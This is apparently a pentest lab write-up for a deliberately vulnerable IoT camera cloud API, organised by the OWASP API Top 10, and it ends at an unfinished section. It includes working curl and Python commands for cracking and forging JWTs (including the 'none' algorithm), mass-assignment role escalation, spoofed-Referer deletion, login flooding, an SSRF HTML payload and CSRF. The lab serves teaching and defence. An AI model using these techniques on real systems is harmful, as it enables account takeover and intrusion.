---
id: "OWLCAM-API"
title: "OwlCam Cloud API Vulnerabilities (OWASP API Security Top 10 2023)"
category: API
status: IN PROGRESS
severity: "Critical to Low (per finding)"
owasp: "OWASP API Security Top 10 2023: API1 BOLA, API2 Broken Authentication, API3 BOPLA, API4 Unrestricted Resource Consumption, API5 BFLA, API6 Unrestricted Access to Sensitive Business Flows, API7 SSRF, API8 Security Misconfiguration, API9 Improper Inventory Management, API10 Unsafe Consumption of APIs"
cwe:
  - "CWE-639 Authorization Bypass Through User-Controlled Key (API1)"
  - "CWE-287 Improper Authentication, CWE-798 Use of Hard-coded Credentials (API2)"
  - "CWE-213 Exposure of Sensitive Information (API3)"
  - "CWE-770 Allocation of Resources Without Limits or Throttling (API4)"
  - "CWE-285 Improper Authorization (API5)"
  - "CWE-840 Business Logic Errors (API6)"
  - "CWE-918 Server-Side Request Forgery, CWE-352 Cross-Site Request Forgery (API7)"
  - "CWE-16 Configuration, CWE-200 Exposure of Sensitive Information (API8)"
  - "CWE-22 Improper Limitation of a Pathname to a Restricted Directory (API9)"
  - "CWE-79 Cross-site Scripting, CWE-345 Insufficient Verification of Data Authenticity (API10)"
affected_components:
  - "cloud_api/owlcam/api_server/app.py"
  - "cloud_api/owlcam/api_server/config.py"
  - "cloud_api/owlcam/api_server/services/jwt_service.py"
  - "cloud_api/owlcam/api_server/static/js/messages.js"
  - "cloud_api/owlcam/api_server/core/c2_diag.py"
findings:
  - "API1: DONE"
  - "API2: DONE"
  - "API3: IN PROGRESS"
  - "API4: DONE"
  - "API5: DONE"
  - "API6: PENDING (design only, no store endpoint in this build)"
  - "API7: DONE"
  - "API8: IN PROGRESS"
  - "API9: DONE"
  - "API10: DONE"
  - "trigger_update RCE (API8, CWE-78): IN PROGRESS"
  - "firmware/upload (API8, CWE-434/22): IN PROGRESS"
  - "api/v1/debug/sessions (API9/API2): IN PROGRESS"
  - "sessions dump (API9, CWE-200): IN PROGRESS"
  - "camerasdb delete/restart (API8/API5): IN PROGRESS"
  - "api/debug/decode_token (API9, CWE-489): IN PROGRESS"
---

# API1:2023 - Broken Object Level Authorization

## 1. Userinfo leak

> **DONE**

- The `/api/v1/userinfo?id=...` endpoint allows retrieval of sensitive information (username, role, etc.) for **any user** simply by knowing their identifier.
- Resources such as _admin_access.js_ call `/api/v2/userinfo` to obtain data for the user attempting access, utilizing the identifier present in their token. This endpoint **does** validate who is requesting the user data, whereas the previous version does not, as it was originally intended for debugging purposes.
- **No authorization control:** Any authenticated user (or even unauthenticated, if the endpoint does not require authentication) can query information about other users.
- The frontend (_admin_access.js_) uses this endpoint to validate the user's role. However, **the endpoint does not verify whether the requester has permission** to access the requested user's data. The frontend assumes that if this function returns a role of _"admin"_, it can then request the administration panel via POST to _/admin_, which will allow access to administrator functionalities. The issue arises because the frontend code reveals an internal server route, _/api/v2/userinfo_, which suggests the possibility of accessing a previous version that does not validate the requesting user.
- An attacker can **enumerate IDs** and obtain a map of users, their roles, and installed cameras, facilitating privilege escalation attacks, internal phishing, or resource mapping.

Any user can access /admin panel in order to validate its role. If the user is not an admin account, the panel will refuse the access attempt. Pressing "Validate Access" button will call for /api/v2/userinfo in order to get user's information to check this. This endpoint is secured up so an user cannot use it to get other users information.

![[api1-restricted-access.png]]

![[api1-userinfo.png]]

The endpoint filters user information using the JWT auth token, but it also accepts an ID via URL parameters. This design decision allows administrators to retrieve information from other accounts.

![[api1-id-parameter.png]]

However, users with the `viewer` role are restricted from retrieving information from other accounts.

![[api1-retrieve-others-info.png]]

> **NOTE:** Remember that the primary goal of this platform is learning; you are encouraged to do whatever it takes to achieve it. Feel free to use the provided user credentials to inspect MongoDB collections or access the Raspberry Pi via SSH. Black-box, gray-box, and white-box approaches are all valid methodologies for learning how to pentest IoT products.

As previously mentioned, the API exposes an older version of the `userinfo` function. This initial version does not validate whether the requesting user has administrative privileges.

![[api1-v1-userinfo.png]]

## 2. Bypass: /snapshot endpoint
### Relevant code in app.py (/snapshot)::

```python
# VULNERABILITY: Admin/viewer bypass with valid JWT
if token:
  result = validate_jwt_token(token)
  if result.get('status') == 200:
    user_id = result.get('user_id')
    user = mongo_client.vulnzoo_vuln.users.find_one({'_id': ObjectId(user_id)})
    role = user.get('role') if user else None
    # Admin/viewer bypass
    if role in ['admin', 'viewer']:
      print(f"{role.capitalize()} access granted to camera {camera_id}", flush=True)
    else:
      return jsonify({'error': 'Insufficient permissions'}), 403
  else:
    if not session_id:
      return jsonify(result), result.get('status', 401)
elif session_id:
  # VULNERABILITY: Session bypass (if there is no token but there is a session_id)
  session = mongo_client.vulnzoo_vuln.sessions.find_one({'_id': ObjectId(session_id)})
  if not (session and session.get('status') == 'active'):
    return jsonify({'error': 'Invalid session'}), 403
else:
  return jsonify({'error': 'Authentication required'}), 401
```

The `/snapshot` endpoint allows users with a valid JWT and ‘admin’ or ‘viewer’ role to access snapshots from any camera, without verifying whether they actually have access to that specific resource. This constitutes an object-level authorization bypass, as ownership and permissions on the requested camera are not checked. Furthermore, if a valid session_id is provided, the resource can also be accessed without JWT authentication, which increases the attack surface.

**Impact:**
- Unauthorized access to other users' camera resources.
- Exposure of sensitive images and data.

**Recommendation:**
- Implement object-level authorization checks on the `/snapshot` endpoint to ensure that only the owner or authorized users can access each camera.


---

### OWASP API1:2023 Reference

> **API1:2023 - Broken Object Level Authorization**  
> APIs tend to expose endpoints that handle object identifiers, creating a wide attack surface Level Access Control issue. Object level authorization checks should be considered in every function that accesses a data source using an input from the user.

---

### Summary

- The endpoint allows access to objects (users) without authorization checks.
- **Impact:** Enumeration of users, roles, and resources linked to users.
- **Solution:** The endpoint must verify that the requester has permission to access the requested user's data (for example, only the user themselves or an administrator). Additionally, internal endpoints that expose sensitive user information should not be revealed in the frontend.

# API2:2023 - Broken Authentication
## 1. Vulnerabilities in /snapshot endpoint
### Relevant code in app.py (/snapshot):

```python
# VULNERABILITY: Admin/viewer bypass with valid JWT
if token:
  result = validate_jwt_token(token)
  if result.get('status') == 200:
    user_id = result.get('user_id')
    user = mongo_client.vulnzoo_vuln.users.find_one({'_id': ObjectId(user_id)})
    role = user.get('role') if user else None
    # Admin/viewehardwarer bypass
    if role in ['admin', 'viewer']:
      print(f"{role.capitalize()} access granted to camera {camera_id}", flush=True)
    else:
      return jsonify({'error': 'Insufficient permissions'}), 403
  else:
    if not session_id:
      return jsonify(result), result.get('status', 401)
elif session_id:
  # VULNERABILITY: Session bypass (if there is no token but there is a session_id)
  session = mongo_client.vulnzoo_vuln.sessions.find_one({'_id': ObjectId(session_id)})
  if not (session and session.get('status') == 'active'):
    return jsonify({'error': 'Invalid session'}), 403
else:
  return jsonify({'error': 'Authentication required'}), 401
```

The `/snapshot` endpoint presents several vulnerabilities related to Broken Authentication and access control:

- **Role-based authorization bypass:** Allows any user with a valid JWT and ‘admin’ or ‘viewer’ role to access snapshots from any camera, without verifying whether they actually have access to that specific camera. There is no ownership control or granular permissions.

- **Session bypass:** If a JWT is not provided, but a valid and active session_id is, access to the snapshot is allowed. This allows JWT authentication to be bypassed and access to be gained with only a session ID, which could be guessed or stolen.

- **Uncontrolled resource exposure:** There is no validation that the user has access to the requested camera, only that the camera is active. A user can query any valid camera_id and obtain images.

- **Lack of enumeration protection:** An attacker can iterate over possible camera_ids and session_ids to discover active cameras and valid sessions.

- **Detailed error messages:** Error messages are informative and can help an attacker map the system (e.g., “Camera not found,” “Camera not available,” “Failed to capture frame”).

**Impact:**
- Unauthorized access to camera images.
- Privilege escalation and exposure of sensitive resources.
- Facilitates enumeration and information gathering attacks.

**Recommendation:**
- Implement authorization controls by object (verify that the user has access to the requested camera).
- Do not allow access with session_id alone.
- Limit the information exposed in error messages.

## 2. Session Not Properly Bound to User

### Description

The `session_required_html` decorator is intended to protect HTML and JS resources by ensuring that a user has a valid `session_id` cookie. However, the implementation only checks if the provided `session_id` exists in the database, without verifying that the session is actually associated with the currently authenticated user or matches the user referenced by any JWT token in use.

This means that if an attacker obtains a valid `session_id` (for example, by stealing it or guessing it), they can use it to access protected resources, regardless of which user the session actually belongs to. The system does not enforce that the session is bound to the correct user context.

![[api2_unsafe_validation_example.png]]

### OWASP API Top 10 Reference

This vulnerability falls under **API2:2023 - Broken Authentication** in the [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/). Broken Authentication covers flaws where authentication or session management is incorrectly implemented, allowing attackers to compromise authentication tokens or exploit implementation flaws to assume other users' identities.

### Impact

- **Session Fixation:** Attackers can reuse valid session IDs to impersonate other users.
- **Privilege Escalation:** If session IDs are predictable or leaked, attackers may gain unauthorized access to sensitive resources.
- **Loss of Confidentiality:** Sensitive user data may be exposed to unauthorized parties.

### Recommendation

Always ensure that sessions are tightly bound to the authenticated user. When validating a session, check not only that the session exists, but also that it is associated with the correct user identity (e.g., by matching user IDs or validating against a JWT token). Additionally, implement secure session management practices such as regenerating session IDs upon login and logout, and expiring sessions appropriately.

## 3. Insecure JWT

> **DONE**

The attacker can log in using the user _john_ with the password _doe123_. This user has a camera registered under their name but cannot access it because they have not yet been verified in the system. This is inferred by the attacker upon accessing `/messages`, where the support team informs them that verification is required to access their camera.

![[api2_support_welcome_message.png]]

The issue is that, at this point, the user has no way to complete the verification process, which may be tedious and slow. As a result, the user prefers to attempt to hack the admin account and investigate how to grant themselves permission. While it may seem exaggerated for the administrator—who already has full system access—to grant themselves permission, it becomes useful if the attacker achieves their objective.

The JWT token used for user authentication is insecure. Its structure is as follows:

```json
HEADER
{
  "alg": "HS256",
  "typ": "JWT"
}
PAYLOAD
{
  "user_id": "68f9fd4e9616b47711d6a0d1",
  "iat": 1761290812,
  "exp": 1761377212
}
SIGN JWT
supersecretkey
```

As shown, the token's signing key is highly predictable and can be found in basic password dictionaries such as [SecLists](https://github.com/danielmiessler/SecLists). This weakness allows the token to be compromised using tools like [Hashcat](https://github.com/hashcat/hashcat).

For example, when attempting to access the _/admin_ endpoint, which checks for administrator privileges, the server returns a **401** status code (unauthorized) if a valid token is provided without the necessary permissions. If an invalid token is submitted, an error indicating an invalid token is returned.

```bash
maxgarci@maxgarci-Ubuntu:/usr/share/wordlists/SecLists$ curl -s -X GET http://192.168.2.101:5000/admin
{
  "error": "Invalid token"
}

(BurpSuite)

HTTP/1.1 401 UNAUTHORIZED
Server: Werkzeug/3.1.3 Python/3.11.14
Date: Fri, 24 Oct 2025 09:31:35 GMT
Content-Type: application/json
Content-Length: 31
Connection: closeJSON eJSON e

{
  "error": "Invalid token"
}
```

Using a token belonging to a user without administrative privileges results in the server responding with an _"Unauthorized"_ error.

```bash
maxgarci@maxgarci-Ubuntu:/usr/share/wordlists/SecLists$ curl -s -X GET http://192.168.2.101:5000/admin \
> -H "X-Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjhmOWZkNzA5NjE2YjQ3NzExZDZhMGQ2IiwiaWF0IjoxNzYxMjk1MzAxLCJleHAiOjE3NjEzODE3MDF9.N9VOgHw1-qs5cSGJzyYgcDqGGhJCqMUWnNL78vWBvWE"
{
  "error": "Unauthorized"
}
```

It can be inferred that if the token only stores the user's identifier and the server relies solely on the token to validate authorization, obtaining the identifier of a privileged user could potentially grant elevated access.

In theory, there may be parts of the application where the token signature is not properly validated, allowing actions or data retrieval by simply including the administrator's ID in the token payload. However, the first step is to assess the security of the token signature.

To obtain the administrator's identifier, a support request is submitted via the _/support_ endpoint, which allows users to send incident messages to the support team.

![[api2_support_contact_panel.png]]

This request is processed as follows:

![[api2_support_submit_burpsuite.png]]

The server's response instructs the user to check the messaging section for a reply, which is expected within 1 to 2 days. Upon accessing the messages section, a notification is received confirming that the incident has been registered and will be reviewed.

By analyzing the data traffic for the _/messages_ endpoint, it is observed that the rendered template is first retrieved. Subsequently, the browser's JavaScript code sends a request to _/api/messages_, receiving data in JSON format. The response contains a _messages_ list, which includes details of received messages. Each message contains the identifiers of both the sender and the recipient. The automatic confirmation message is sent by the system administrator, thereby revealing their user ID.

![[api2_sender_id_filtered.png]]

This scenario is known as _Excessive Data Exposure_ and is categorized under [[#API3:2023 - Broken Object Property Level Authorization|Broken Object Property Level Authorization]]. The _/api/messages_ endpoint exposes the sender's user ID, which is a sensitive property and should not be accessible to regular users.

Next, an attempt is made to access _/admin_ using the administrator's identifier. A new JWT is crafted using the original token's structure, and a request is sent to _/admin_.

```HTTP
HTTP/1.1 401 UNAUTHORIZED
Server: Werkzeug/3.1.3 Python/3.11.14
Date: Fri, 24 Oct 2025 09:31:21 GMT
Content-Type: application/json
Content-Length: 30
Connection: close

{
  "error": "Unauthorized"
}
```

For an HS256 token the server verifies the signature, so a token re-signed with the wrong key is rejected (the 401 above). The secret is weak and crackable, and the server additionally accepts the `none` algorithm (see the bypass below), which skips signature verification entirely.

```bash
maxgarci@maxgarci-Ubuntu:/usr/share/wordlists/SecLists$ hashcat -a 0 -m 16500 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjhmOWZkNzA5NjE2YjQ3NzExZDZhMGQ2IiwiaWF0IjoxNzYxMjkxNTk5LCJleHAiOjE3NjEzNzc5OTl9.otACZTMRSFUbgj3oS_pvMvC58EFmWM4KlQFIx615mbQ" ./Passwords/scraped-JWT-secrets.txt --show
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjhmOWZkNzA5NjE2YjQ3NzExZDZhMGQ2IiwiaWF0IjoxNzYxMjkxNTk5LCJleHAiOjE3NjEzNzc5OTl9.otACZTMRSFUbgj3oS_pvMvC58EFmWM4KlQFIx615mbQ:supersecretkey
```

Using the newly generated token, authentication as the administrator is possible, granting access to privileged functions such as changing user roles.

### Bypass: the `none` algorithm (no cracking needed)

> **IN PROGRESS**

The token validator also honors the `none` algorithm, so the signature step can be skipped entirely. The server enables it in `config.py` (`JWT_ALLOW_NONE_ALGORITHM=True`), and when a token header declares `alg: none` the validator decodes it with signature verification disabled. An attacker forges an admin token with no signature and no knowledge of the secret:

```python
import jwt
# admin user_id leaked via /api/messages, /api/system/logs or /api/v1/userinfo
tok = jwt.encode({'user_id': '<ADMIN_ID>'}, key='', algorithm='none')
```

Send `tok` as the `X-Auth-Token` header to any JWT-gated endpoint (for example `/api/cameras` or `/admin/roles`) and the server treats the request as the admin, with no signature required. This is the fastest path to administrator, the hashcat crack above is only needed if the `none` algorithm is later disabled.

![[api2_admin_access.png]]

> **DISCLAIMER**: New updates on the API has resulted on the need of having an existing session_id on the browser's cookies in order to attempt a illegitimate access to others users' camera lists.

# API3:2023 - Broken Object Property Level Authorization

## In use with (Broken Authentication) JWT Attack - Excessive Data Exposure

> **DONE**

The _/api/messages_ endpoint exposes sensitive information by revealing the identifier of the user who sends each message. This information can be leveraged to perform attacks such as the previously described [[#3. Insecure JWT]].

![[api2_sender_id_filtered.png]]
## Session token capture - Mass Assignment

> **IN PROGRESS**

The `/profile/change_password` endpoint updates the caller's user document with every field present in the JSON body, not just the password. It strips only the two control keys (`current_password`, `new_password`) and writes the rest straight into the document with `$set`. A user can therefore assign themselves any property, including a privileged `role`, by tacking it onto a password change:

```zsh
# john (role 'user') escalates himself to admin during a normal password change.
# TOKEN is john's JWT (forge it with the weak HS256 secret, see API2).
curl -s -X POST http://localhost:5000/profile/change_password \
    -H "X-Auth-Token: $TOKEN" -H "Content-Type: application/json" \
    -d '{"current_password":"doe123","new_password":"doe123","role":"admin"}'
# -> {"message":"Password changed successfully"}  and john.role is now "admin" in the DB
```

After this, john's account carries `role: admin`, so the same JWT clears the `/snapshot` admin/viewer check (see [[#API1:2023 - Broken Object Level Authorization|BOLA]]) and every other role-gated flow. The same primitive writes any other field an attacker knows the backend trusts (for example a long-lived session identifier under the `admin_session` key), which is the persistence path described below. Verified in isolation, the update construction persists `role:admin` and excludes the control keys. Live end-to-end verification is pending the API image rebuild (`docker compose up --build`), so this finding is `IN PROGRESS`.

This attack targets session management and authentication tokens. When an unauthorized user attempts to access the _/admin_ endpoint, the endpoint returns a null _admin_session_ cookie, indicating that access to the administration panel is denied.

To simplify administrator login to the administration panel, the server creates an _admin_session_. This information is stored in the administrator's browser cookies and lacks protection against cookie theft. A professional implementation should use random session identifiers, associate the session with a secret, enforce expiration controls, and validate the session on every request. Additionally, HTTPS should be used, and protections against XSS and CSRF should be implemented.

With this information, it can be inferred that access to the panel or its subdirectories might be possible using a short-lived token (_access token_). To obtain such a token, one must acquire it from an administrator account (see [[#API7:2023 - Server Site Request Forgery|SSRF Attack]]).

After obtaining the access token, it is observed that it has a relatively short expiration time. At the "change password" endpoint, users can update their password; however, the backend does not properly validate the input and generically updates profile data. Consequently, if the administrator's access token is provided and a field with the same key name as the _admin_ cookie is submitted, the request is validated. As a result, a valid session token with a long expiration period is registered to the user's account in the database, granting indefinite access to the administration panel.

## Demonstration

After the attacker logs into the system and discovers the existence of an administrator-specific subdirectory at _/admin_, they proceed to access and inspect its functionality. Within this section, a button is available that allows the user to validate their session.

![[api3_restricted_access_admin.png]]

By examining the JavaScript code (_admin_access.js_), it becomes apparent how the server operates behind the scenes. The code is straightforward: it waits for the interactive button to be pressed, then performs a verification by submitting the JWT data to the _/api/v2/userinfo_ endpoint. The response indicates whether the user has administrator privileges. This "platform" layer prevents direct exposure of the administration panel's internal endpoints by introducing an intermediate verification step.

![[api3_validateAccess_function.png]]

1. The user's information is extracted.
2. The system checks if the user is an administrator. If not, the frontend displays an error message indicating insufficient privileges. If the user is an administrator, a POST request is sent to the _/admin_ endpoint, granting access to various administrative functionalities.
3. Once the _admin.html_ template data is retrieved, the frontend updates to display the administration panel.

Given this behavior, the user may suspect two things: first, they might attempt to connect to the earlier version of the _/api/v1/userinfo_ endpoint, which may still be available and represent an additional attack surface (an outdated debugging function lacking proper controls; for more information, see [[#API1:2023 - Broken Object Level Authorization|Broken Object Level Authorization]]). Second, they may investigate the server's response when attempting to access the _/admin_ endpoint without sufficient privileges, a scenario not initially handled by the frontend.

```bash
maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ curl -v -X POST http://192.168.2.101:5000/admin \
> -H "X-Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjkwODUwNjhiNWNlYWMxZmY0Yzg4NjkzIiwiaWF0IjoxNzYyMTU0Nzc2LCJleHAiOjE3NjIyNDExNzZ9.Kh6qML_XUcZhtJqqtGvURsvW2yR8OYkD7jjM5rN_dQ8"
*   Trying 192.168.2.101:5000...
* Connected to 192.168.2.101 (192.168.2.101) port 5000
> POST /admin HTTP/1.1
> Host: 192.168.2.101:5000
> User-Agent: curl/8.5.0
> Accept: */*
> X-Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjkwODUwNjhiNWNlYWMxZmY0Yzg4NjkzIiwiaWF0IjoxNzYyMTU0Nzc2LCJleHAiOjE3NjIyNDExNzZ9.Kh6qML_XUcZhtJqqtGvURsvW2yR8OYkD7jjM5rN_dQ8
> 
< HTTP/1.1 403 FORBIDDEN
< Server: Werkzeug/3.1.3 Python/3.11.14
< Date: Mon, 03 Nov 2025 07:48:27 GMT
< Content-Type: application/json
< Content-Length: 27
< Set-Cookie: admin_session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Path=/; SameSite=Lax
< Connection: close
< 
{
  "error": "Forbidden"
}
* Closing connection
```

The server exposes information that may be valuable to an attacker. Even when the user is not authenticated to access the administration panel, a header is sent indicating that a cookie named _"admin_session"_ should be set with an empty value. Although the exact purpose of this cookie is unclear, its name suggests it is related to an administrator session. It can be inferred that this mechanism may be used to validate privileged user sessions for accessing administrative endpoints.

---

# API4:2023 - Unrestricted Resource Consumption

> **DONE**

The login panel processes authentication requests via a POST request to the _/login_ endpoint. This endpoint contains a logic flaw that allows excessive consumption of database resources, potentially leading to system denial of service.

```python
@app.route('/api/v2/login', methods=['GET', 'POST'])
def login_api():
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400

	existing_session = mongo_client.vulnzoo_vuln.sessions.find_one({'username': username, 'ip': ip, 'user_agent': request.headers.get('User-Agent')})
	# Session searching . . .
	if not user or user['password'] != password:
		existing_session['attempts'] += 1
	#... More code
```

The _/login_ endpoint allows an attacker to create short-lived sessions in the database without temporal controls. Although the server enforces a limit of three login attempts per IP address—blocking further attempts from that IP after the limit is exceeded—an alternative API endpoint, _/api/v1/login_, remains available without any login attempt restrictions.

If an attacker discovers this endpoint, they can not only perform brute-force attacks but also flood the database with "zombie" sessions.

## Demonstration

> **DONE**

The deprecated `/api/v1/login` inserts a new session document into the database on every POST, before it even checks the credentials, and it enforces no per-IP attempt cap. The hardened `/api/v2/login` reuses one session per (username, ip, user-agent) and returns `429` after three failures. Hitting each endpoint six times with bad credentials shows the asymmetry:

```zsh
# v1 (deprecated, uncapped): every attempt is 401 AND spawns a zombie session, no 429 ever
for i in $(seq 1 6); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://localhost:5000/api/v1/login \
    -H "Content-Type: application/json" -d '{"username":"bf","password":"wrong"}'
done   # -> 401 401 401 401 401 401   (6 new sessions created)

# v2 (rate limited): capped at three attempts
for i in $(seq 1 6); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://localhost:5000/api/v2/login \
    -H "Content-Type: application/json" -d '{"username":"bf2","password":"wrong"}'
done   # -> 401 401 401 429 429 429
```

Verified on the running stack: six `/api/v1/login` attempts produced six `401` responses and six new session documents with no throttling, while `/api/v2/login` returned `401 401 401 429 429 429`. An attacker who finds the v1 endpoint can therefore brute-force credentials without limit and flood the `sessions` collection with unbounded "zombie" documents, driving unrestricted resource consumption and denial of service.

---

# API5:2023 - Broken Function Level Authorization

> **DONE**

## Referer-based BFLA

The application is vulnerable to **Broken Function Level Authorization (BFLA)**, as access control for administrative functions relies solely on the HTTP `Referer` header instead of robust permission checks.

Administrative endpoints under `/admin` (e.g., `/admin/users/<user-id>`) provide sensitive operations such as user deletion, role assignment, and camera management. The backend does not validate user roles or JWT authenticity; access is granted if the `Referer` header contains `/admin` or `/admin/user`. This design flaw allows any user to invoke administrative actions by manipulating the `Referer` value in their requests.

For example, the user profile panel permits account deletion by calling the same endpoint used by administrators, with the user's identifier as a parameter. There is no separation between user and administrator functionalities, exposing privileged routes and enabling potential misuse.

An attacker can exploit this by sending crafted requests with a forged `Referer` header, impersonating an administrator and deleting any account in the system. This enables privilege escalation and unauthorized access to critical operations, fundamentally compromising the application's security model.

In summary, administrative access control is insufficient, as it depends on a client-controlled header rather than proper authorization based on user identity and role.

## Demonstration

_profile.js_ exposes the route used by the administrator to delete users. This design flaw (failing to separate admin functions from lower-privileged user roles) leads to an exposure of administrative endpoints.

![[api5_JS_exposes_admin_function.png]]

If we attempt to manipulate the account deletion action, we observe that our user identifier is used to perform the deletion, along with the _/admin/users_ route, confirming that an administrative function is being invoked. By specifying the identifier of another user, such as _elliot_, the laboratory provides a hint.

![[api5_elliot.png]]

> **NOTE:** You may wonder how an attacker can get other users' ID. Check [[#API3:2023 - Broken Object Property Level Authorization]], [[#1. Userinfo leak]], [[#Attack Vector #2: Information Disclosure via System Logs]] and [[#API8:2023 - Security Misconfiguration]].

![[api5_user_delete_attempt.png]]

However, if the request is crafted to appear as if it originates from the administration panel, this restriction can be bypassed.

![[api5_referer_field_bypass.png]]

This can be verified by creating a new user with the same name as the deleted user.

![[api5_register_user_verification.png]]

---
# API6:2023 - Unrestricted Access to Sensitive Business Flows

> **PENDING**

> **Status: design proposal, not implemented in this build.** The current API ships no store, checkout, or voucher endpoint, so the flow below describes an intended vulnerability rather than a reproducible one. It is kept here as the specification for a future build. Do not present it as a live attack until the endpoints exist.

A user can purchase cameras and services through the store menu. The company offers a promotion in which new users receive a voucher that allows their first purchase to be free. The voucher consists of a series of encrypted data that is difficult to crack; however, the endpoint responsible for generating and returning the voucher to the user is not secure.

The voucher is created using several data fields, including the ID of the user who made the purchase. However, the use of this ID is not properly verified; as long as the code is valid, the endpoint permits the purchase. Consequently, an attacker can create multiple new user accounts and use these vouchers on their own account to make unlimited purchases.

---
# API7:2023 - Server Site Request Forgery

## Change administrator password

The */profile* endpoint displays a function for changing the password. If we analyze the JavaScript code, we can see that the request is made to the */profile/change_password* endpoint. By analyzing a password change request, we can see how it is processed by the server.

![[api7_change_password.png]]
Knowing how this request is processed, we can try to trick the server into processing a request. 
## Internal pre-production resource

The server has an internal service with *bind* that loads the administration page in pre-production through a port that cannot be listed unless the user uploads a file capable of rendering the content of other resources via “File Upload.” With this file from the official server, you can redirect to the loopback port to load the pre-production panel and see the different routes that the administration panel has or confidential information. The file could be uploaded either by */api/support/modify* or if I implement a section for the profile, where the user can upload a profile photo as an avatar that is not properly sanitized and can execute commands.

> This internal service could be hosted on another machine or, for example, on the RASPBERRY PI itself, so that the attacker can interact directly with the API alone, but the API has two interfaces, one for communicating with clients and another for the RASPBERRY PI. If the server's operation is altered by SSRF, this resource could be targeted on another network.

> **DONE**

### Reproduced: SSRF via the support-ticket file processor

The concrete SSRF sink is `process_support_file` in `app.py`. When a support ticket carries an HTML attachment, the server decodes it, parses every `<img>` tag, and issues a server-side `requests.get(src)` to each `src`. The upload endpoint `/api/support/modify` only checks the multipart `Content-Type` against an image/PDF allow-list, while the processor keys off the file *name*, so an attacker uploads an HTML payload named `x.html` with a forged `Content-Type: image/png` and the server fetches whatever internal URLs the `<img>` tags reference:

```zsh
# TOKEN is any valid user JWT. First open a ticket, then attach the SSRF payload.
curl -s -X POST http://localhost:5000/api/support/submit -H "X-Auth-Token: $TOKEN" \
    -F "issue_type=other" -F "message=hi"          # -> ticket_id in the DB

printf '%s' '<html><img src="http://mongo:27017/"><img src="http://vulnzoo-secure:5001/"></html>' > x.html
curl -s -X POST http://localhost:5000/api/support/modify -H "X-Auth-Token: $TOKEN" \
    -F "ticket_id=<ID>" -F "comment=x" \
    -F "file=@x.html;type=image/png;filename=x.html"
```

Verified on the running stack, the response `processing_results` proves the server reached internal-only hosts the external client cannot even resolve:

```json
"processing_results": [
  { "src": "http://mongo:27017/",        "error": "RemoteDisconnected('Remote end closed connection without response')" },
  { "src": "http://vulnzoo-secure:5001/", "status": 200 }
]
```

The `mongo:27017` fetch established a TCP connection to the internal MongoDB port (Mongo aborts the non-protocol HTTP request), and `vulnzoo-secure:5001` returned `200` from a separate internal container. An attacker can pivot this to the loopback pre-production panel, the C2 service, or the Raspberry Pi across the API's second interface. Note that pointing `src` at the live MJPEG stream (`:9090/video`) hangs the fetch, since the server downloads the never-ending multipart body, which is itself a denial-of-service primitive.

The form found in the `admin.html` template can also be exploited by CSRF if the admin user visits a malicious page, because it does not include any CSRF token or additional validation.

```html
<form method="POST" action="/admin/roles">
    <!-- ... -->
</form>
```

The endpoint `/admin/roles` accepts any POST request if the user has a valid session. An attacker can create a malicious page with a hidden form that sends a POST request to `/admin/roles`, and if the administrator is authenticated and visits this page, the browser will automatically send the session cookies, the backend will receive the request, and since it enforces only a weak `Referer` substring check (it just looks for `/admin` anywhere in the header) with no CSRF token, a POST from an attacker page whose own URL path contains `/admin` is processed as a legitimate role change by the admin.

The attacker can take advantage of the `/support` endpoint that links to a resource that allows them to contact the administrator. This endpoint is used for new users to request access to the cameras from the administrator, granting them the role of `viewer`.

In the request submission form that the system administrator will subsequently see, files such as images can be included to report errors and questions. These images can be attack vectors where the attacker includes HTML code that sends POST requests to the `/admin/roles` endpoint.


# API8:2023 - Security Misconfiguration

> **DONE**
## Description

The _/register_ endpoint allows clients to register on the platform. When a user attempts to register with an already existing username, the system reports that the user cannot be created. Although this functionality is common, it exposes an attack surface, as an attacker could use it to enumerate existing users in the system.

To mitigate this risk, it is standard practice for web applications to implement protection mechanisms against user enumeration, such as _rate limiting_ policies and monitoring of suspicious activity. However, in this case, the API does not apply any restrictions or monitoring controls, which constitutes a **Security Misconfiguration** vulnerability according to the OWASP API8:2023 category.

## Demonstration

When attempting to create a user with credentials that already exist in the system, the response indicates that the user already exists.

The interface does not allow the use of empty _Password_ fields, as the JavaScript code enforces validation and rejects such submissions. This restriction can be bypassed either by modifying the JavaScript code or by using tools such as _BurpSuite_ to intercept and alter the requests.

It is observed that the server accepts requests even when the _password_ and _confirmPassword_ fields are omitted.

![[api8_register.png]]

![[api8_users_exposure.png]]

```bash
maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ curl -s -X POST http://192.168.2.101:5000/register -H "Content-Type: application/json" -d '{"username":"john", "password":"doe123"}'
{
  "error": "User already exists."
}

maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ curl -s -X POST http://192.168.2.101:5000/register -H "Content-Type: application/json" -d '{"username":"john", "password":"doe"}'
{
  "error": "User already exists."
}

maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ curl -s -X POST http://192.168.2.101:5000/register -H "Content-Type: application/json" -d '{"username":"john"}'
{
  "error": "User already exists."
}

maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ curl -s -X POST http://192.168.2.101:5000/register -H "Content-Type: application/json" -d '{"password":"doe123"}'
{
  "error": "Username and password required."
}
```

Furthermore, the server returns a different message if the username does not exist in the system but a valid password is not provided during registration.

By analyzing the response messages and HTTP status codes, it is possible to perform user enumeration attacks. In this demonstration, the tool [wfuzz](https://github.com/xmendez/wfuzz) was used to automate the enumeration process.

```script
